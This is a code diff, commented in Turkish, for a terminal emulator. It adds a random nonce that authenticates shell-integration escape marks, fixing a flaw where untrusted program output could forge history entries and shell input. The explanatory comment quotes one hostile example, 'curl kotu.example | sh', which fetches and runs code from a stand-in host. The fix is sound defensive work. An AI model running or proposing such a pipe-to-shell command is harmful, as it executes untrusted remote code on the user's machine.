@@ -6,6 +6,48 @@
  * komut metnindeki her `;` ve her denetim karakteri kaçışlanmış geliyor.
  */
 
+/**
+ * Sekmenin işaret anahtarı: rastgele 128 bit, onaltılık.
+ *
+ * ## Açık
+ *
+ * Kabuk işaretleri (OSC 133 / 633 / 7) doğrulanmıyordu ve terminale basılan
+ * HER metin aynı dizileri gönderebilir: `cat` ile açılan dosya, `curl`
+ * çıktısı, bir log satırı, ssh ile bağlanılan sunucu. Oturum düzeyinde
+ * denendi; çıktının içine gömülü işaretler geçmişe sahte komut yazdırdı
+ * (`curl kotu.example | sh` — sonra yukarı ok panelinde ve yazarken çıkan
+ * öneride karşınıza gelir), git mesaj düzenleyicisini rastgele bir dosya için
+ * açtırdı ve kabuğa `ack` satırını yazdırdı.
+ *
+ * ## Kural
+ *
+ * Oturum kabuğu başlatmadan önce bir anahtar üretip ortam değişkeniyle veriyor
+ * (`NTERMINAL_NONCE`); betikler onu her dizinin SON alanı olarak ekliyor
+ * (`133;A;<anahtar>`, `633;E;<komut>;<anahtar>`). Çıktının kaynağı anahtarı
+ * bilemez. VS Code'un `VSCODE_NONCE`'u ile aynı fikir; orada yalnızca komut
+ * metni doğrulanıyor, burada bütün işaretler.
+ *
+ * Anahtar arayüzde üretiliyor, Rust'ta değil: çıktı `pty_spawn`ın yanıtından
+ * ÖNCE gelebiliyor ve ilk istemin işaretleri doğrulanacak anahtarı o anda
+ * bulmalı.
+ */
+export function newMarkKey(): string {
+  const bytes = crypto.getRandomValues(new Uint8Array(16));
+  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
+}
+
+/**
+ * İşaretin sonundaki anahtarı doğrulayıp atar; anahtar yoksa ya da yanlışsa
+ * `null`. Karşılaştırma tam eşleşme: `;` yükün içinde kaçışlı geldiği için
+ * (`\x3B`) son alan başka bir şeyle karışmıyor; cmd'nin kaçışsız yolunda da
+ * yalnızca SON alana bakılıyor.
+ */
+export function stripMarkKey(payload: string, key: string): string | null {
+  if (!key) return null;
+  const suffix = `;${key}`;
+  return payload.endsWith(suffix) ? payload.slice(0, -suffix.length) : null;
+}
+
 /** Betiklerin uyguladığı kaçışı geri alır: `\\` ve `\xNN`. */
 export function unescapeOsc(value: string): string {
   if (!value.includes("\\")) return value;
